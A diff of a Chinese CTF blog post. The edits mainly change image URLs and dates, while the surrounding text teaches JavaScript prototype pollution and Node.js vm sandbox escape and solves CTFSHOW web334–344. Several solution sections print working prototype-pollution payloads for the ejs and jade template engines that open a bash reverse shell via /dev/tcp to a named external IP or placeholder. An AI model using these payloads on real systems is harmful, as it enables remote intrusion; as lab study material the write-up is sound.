@@ -485,7 +485,7 @@ JavaScript中，我们如果要定义一个类，需要以">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-26
+                    2022-03-28
                 </div>
                 
 
@@ -527,23 +527,23 @@ JavaScript中，我们如果要定义一个类，需要以">
 <pre class="language-none"><code class="language-none">var a &#x3D; &#123;&#125;;</code></pre>
 
 <p>它会拥有一些自带的属性，如</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221163610282.png" alt="image-20220221163610282"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221163610282.png" alt="image-20220221163610282"></p>
 <p>JavaScript中，我们如果要定义一个类，需要以定义“构造函数”的方式来定义：</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221163750576.png" alt="image-20220221163750576"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221163750576.png" alt="image-20220221163750576"></p>
 <p>这里test()函数的内容其实就是test类的构造函数</p>
 <p>而<strong>constructor</strong>这个属性就是用于查看对象的构造函数</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221164147637.png" alt="image-20220221164147637"></p>
 <p>接下来我们要知道<strong>prototype</strong>和**<em>_proto</em>_**又是什么</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160323103557261-114570044.png" alt="img"></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160323103622089-1134417169.png" alt="img"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103557261-114570044.png" alt="img"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160323103622089-1134417169.png" alt="img"></p>
 <p>从类的角度讲，<code>prototype</code>是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有<code>__proto__</code>出现，且一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性。</p>
 <p>这个特性被用于实现JavaScript中的继承机制，为什么我们定义的a有 toString() 属性？这正是继承机制的作用。</p>
 <p>对于a而言有个__proto__属性指向window.Object.prototype</p>
 <p>这样你在调用a.toString() 的时候，a本身没有 toString，就去 a.<em>_<em>proro</em></em>_ 上面去找 toString。</p>
 <p>所以你调用 a.toString 的时候，实际上调用的是 window.Object.prototype.toString</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221172804302.png" alt="image-20220221172804302"></p>
 <p>对于p神的例子我的理解是对Foo类的父类添加一个show函数，同样是利用继承来实现存在foo.show()</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221173043928.png" alt="image-20220221173043928"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221173043928.png" alt="image-20220221173043928"></p>
 <p>总结一下</p>
 <ol>
 <li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
@@ -555,7 +555,7 @@ JavaScript中，我们如果要定义一个类，需要以">
 <p>①所有<code>引用类型</code>都有一个<code>__proto__(隐式原型)</code>属性，属性值是一个普通的对象<br>②所有<code>函数</code>都有一个<code>prototype(原型)</code>属性，属性值是一个普通的对象<br>③所有<code>引用类型的__proto__</code>属性<code>指向</code>它<code>构造函数的prototype</code>**</p>
 <p><strong>原型链</strong></p>
 <p>当访问一个对象的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会去它的__proto__隐式原型上查找，即它的构造函数的prototype，如果还没有找到就会再在构造函数的prototype的__proto__中查找，这样一层一层向上查找就会形成一个链式结构，我们称为原型链。</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/787416-20160322110905589-2039017350.png" alt="什么是原型链？"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160322110905589-2039017350.png" alt="什么是原型链？"></p>
 <p>举例：</p>
 <p>若有代码</p>
 <pre class="language-none"><code class="language-none">function Parent(month)&#123;
@@ -566,10 +566,10 @@ console.log(child.month); &#x2F;&#x2F; Ann
 console.log(child.father); &#x2F;&#x2F; undefined</code></pre>
 
 <p>则在child中查找某个属性时会</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/20180620134143385" alt="这里写图片描述"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/20180620134143385" alt="这里写图片描述"></p>
 <h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>Object.prototype是一个对象，用于表示Object的原型对象。几乎所有的JavaScript对象都是Object的实例，其原型链上最后一个就是指向Object.prototype。</p>
 <p>所以我们可以通过修改Object.prototype来实现对变量的修改</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221182419388.png" alt="image-20220221182419388"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221182419388.png" alt="image-20220221182419388"></p>
 <p>可以看到我们将a.<em>_proto</em>_.bar 设置为2</p>
 <p>新定义的变量也有了bar属性，且为2</p>
 <p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
@@ -596,10 +596,10 @@ obj[a][b][c] &#x3D; value</code></pre>
 &#125;</code></pre>
 
 <p>这时如果key是__proto__不就可以直接修改其原型了吗</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221200009010.png" alt="image-20220221200009010"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221200009010.png" alt="image-20220221200009010"></p>
 <p>但是这里并没有成功，这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
 <p>只有经过JSON.parse解析,才能让<code>__proto__</code>代表了一个key</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221200323952.png" alt="image-20220221200323952"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221200323952.png" alt="image-20220221200323952"></p>
 <p>成功污染</p>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a></p>
@@ -632,7 +632,7 @@ setTimeout(some_function, 2000);
 相当于匿名函数，即php当中create_function。</code></pre>
 
 <p>eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但 <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020">node</a>.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221225320251.png" alt="image-20220221225320251"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221225320251.png" alt="image-20220221225320251"></p>
 <p>在这段代码中，我们明明定义了y=2但仍然显示y不存在，这正是vm的作用</p>
 <p>vm.runInContext()方法用于编译代码。它在contextifiedObject的上下文中运行代码，然后返回输出。此外，正在运行的代码无法访问本地范围，并且以前使用vm.createContext()方法将contextifiedObject对象上下文化。</p>
 <p>也就是说我们将code这段要编译和运行的代码限制在了context域中，无法访问到超出上下文外的任何信息</p>
@@ -648,22 +648,22 @@ console.log(&quot;Never gets executed.&quot;);</code></pre>
 
 <p>这段代码就是利用了原型链进行vm逃逸导致了程序的提前退出</p>
 <p>创建vm环境时，首先要初始化一个对象 ctx，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。然后利用constructor来得到Function</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221230610013.png" alt="image-20220221230610013"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221230610013.png" alt="image-20220221230610013"></p>
 <p>函数构造器就像javascript给出的最高函数，它可以访问全局范围，因此它可以返回任何全局的东西。 函数构造器允许你从一个字符串中生成一个函数，从而执行任意代码。</p>
 <p>上述代码在执行时，this 指向 ctx 并通过原型链的方式拿到沙盒外的 Funtion，vm 虚拟机环境中的代码逃逸，获得了主线程的 process 变量，并调用 process.exit()，造成主程序非正常退出。</p>
 <p>所以我们能够用process变量来做更多的东西</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220221232104068.png" alt="image-20220221232104068"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221232104068.png" alt="image-20220221232104068"></p>
 <p>或者这样</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222145853148.png" alt="image-20220222145853148"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222145853148.png" alt="image-20220222145853148"></p>
 <p>参考文章</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/122166825">ctfshow—Node.js漏洞总结_cosmoslin的博客-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.javashuo.com/article/p-vwozjvrz-nu.html">node.js 沙盒逃逸分析 - JavaShuo</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13663121.html">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184#toc-10">Node.js 常见漏洞学习与总结 - 先知社区 (aliyun.com)</a></p>
-<h1 id="CTFSHOW-nodejs部分"><a href="#CTFSHOW-nodejs部分" class="headerlink" title="CTFSHOW nodejs部分"></a>CTFSHOW nodejs部分</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154508492.png" alt="image-20220222154508492"></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154516338.png" alt="image-20220222154516338"></p>
+<h1 id="CTFSHOW-nodejs部分"><a href="#CTFSHOW-nodejs部分" class="headerlink" title="CTFSHOW nodejs部分"></a>CTFSHOW nodejs部分</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154508492.png" alt="image-20220222154508492"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154516338.png" alt="image-20220222154516338"></p>
 <p>用户名不为CTFSHOW,还要经过大写转换后等于CTFSHOW,所以传入ctfshow密码为123456就行</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222154618537.png" alt="image-20220222154618537"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154618537.png" alt="image-20220222154618537"></p>
 <h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>js的命令执行</p>
 <p>可以使用chile_process.exec来间接调用/bash.sh。<br>它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。</p>
 <p>exec因为返回值的问题没法利用</p>
@@ -711,59 +711,59 @@ module.exports &#x3D; router;</code></pre>
 <p>传入a和b两个参数，长度相同但并不相等，同时拼接上flag的md5值相同</p>
 <p>js有个很奇怪的特性</p>
 <p>不能直接比较两个数组</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163045534.png" alt="image-20220222163045534"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163045534.png" alt="image-20220222163045534"></p>
 <p>而且拼接字符串时也有个特性</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163227744.png" alt="image-20220222163227744"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163227744.png" alt="image-20220222163227744"></p>
 <p>也就是说我们传入a[]=1&amp;b[]=1就能完美满足if判断得到flag</p>
 <p>而如果我们传入的是非数字索引，那么他就会变成js中的对象</p>
 <p>对象的拼接又有这种特性</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163556092.png" alt="image-20220222163556092"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163556092.png" alt="image-20220222163556092"></p>
 <p>所以我们传入a[x]=1&amp;b[x]=2同样可以满足if判断拿到flag</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222163644062.png" alt="image-20220222163644062"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163644062.png" alt="image-20220222163644062"></p>
 <h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>common.js里有copy函数</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222164222078.png" alt="image-20220222164222078"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164222078.png" alt="image-20220222164222078"></p>
 <p>猜测是原型链污染</p>
 <p>看login.js</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p>
 <p>让secert的ctfshow属性等于36dboy</p>
 <p>{&quot;<em>_proto</em>_&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p>
 <p>抓包之后改一下</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p>
 <h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p><strong>非预期解：</strong>利用ejs模板rce漏洞</p>
 <p>羽师傅的payload：</p>
 <pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre>
 
 <p>反弹之前可以先关一下服务器的防火墙systemctl stop firewalld</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225546970.png" alt="image-20220222225546970"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225546970.png" alt="image-20220222225546970"></p>
 <p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gental_z/article/details/107937110">CVE-2020-7699漏洞分析_gental_z的博客-CSDN博客</a></p>
 <p><strong>预期解：</strong></p>
 <p>登录部分</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222170708843.png" alt="image-20220222170708843"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222170708843.png" alt="image-20220222170708843"></p>
 <p>同样的copy函数</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222170726147.png" alt="image-20220222170726147"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222170726147.png" alt="image-20220222170726147"></p>
 <p>这里要求ctfshow=flag的内容，可我们并不知道flag</p>
 <p>我们再看看api.js</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222171015673.png" alt="image-20220222171015673"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171015673.png" alt="image-20220222171015673"></p>
 <p>如果我们可以利用原型链控制query的值，那么就能实现反弹shell的操作</p>
 <p>但是这个是变量不是变量的属性，也能污染吗</p>
 <p>答案是可以的</p>
 <pre class="language-none"><code class="language-none">因为所有变量的最顶层都是object，当前环境没有，它会直接去寻找Object对象的属性当中是否有这个键值对是否存在</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222173051138.png" alt="image-20220222173051138"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222173051138.png" alt="image-20220222173051138"></p>
 <p>所以我们可以构造payload</p>
 <pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre>
 
 <p>然后访问一下api页面触发query</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p>
 <h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>登录部分</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210758117.png" alt="image-20220222210758117"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210758117.png" alt="image-20220222210758117"></p>
 <p>copy函数：</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210810876.png" alt="image-20220222210810876"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210810876.png" alt="image-20220222210810876"></p>
 <p>这道题与web339利用点是相同的，我们同样要利用原型链污染来控制query的值达到反弹shell的目的。但是需要向上污染两级才能到达Object对象</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210739146.png" alt="image-20220222210739146"></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222210925672.png" alt="image-20220222210925672"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210739146.png" alt="image-20220222210739146"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210925672.png" alt="image-20220222210925672"></p>
 <p>所以我们的payload为</p>
 <pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;服务器IP&#x2F;监听端口 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre>
 
@@ -772,7 +772,7 @@ module.exports &#x3D; router;</code></pre>
 <p>所以只能用web339的那个非预期解，只是要跟web340一样向上污染两级</p>
 <pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220222225203273.png" alt="image-20220222225203273"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225203273.png" alt="image-20220222225203273"></p>
 <h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342-web343"></a>web342-web343</h2><p>同样是模板引擎的rce，不过不是之前的ejs，而是jade</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">再探 JavaScript 原型链污染到 RCE - 先知社区 (aliyun.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析 | L0nm4r (lonmar.cn)</a></p>
@@ -780,7 +780,7 @@ module.exports &#x3D; router;</code></pre>
 <p>用一个payload都能打</p>
 <pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220223144941601.png" alt="image-20220223144941601"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220223144941601.png" alt="image-20220223144941601"></p>
 <h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>代码：</p>
 <pre class="language-none"><code class="language-none">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
   res.type(&#39;html&#39;);
@@ -808,7 +808,7 @@ module.exports &#x3D; router;</code></pre>
 <pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; </code></pre>
 
 <p>把c也编码的原因是防止和双引号的url编码构成%22c</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/js/image-20220223150552411.png" alt="image-20220223150552411"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220223150552411.png" alt="image-20220223150552411"></p>
 
                 
             </div>
@@ -1598,7 +1598,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">77.3k</span>
+                        class="white-color">81k</span>
             
             
             
